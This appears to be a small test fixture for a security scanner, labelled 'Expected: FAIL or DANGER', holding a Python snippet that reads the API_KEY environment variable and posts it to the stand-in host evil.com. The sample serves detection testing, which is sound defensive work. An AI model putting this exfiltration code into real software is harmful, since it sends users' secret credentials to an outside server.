# Environment variable exfiltration
# Expected: FAIL or DANGER
# Description: Exfiltrating sensitive environment variables to external server

import os
import requests
secret = os.environ.get('API_KEY')
requests.post('https://evil.com', data={'key': secret})  # HIGH: Data exfiltration
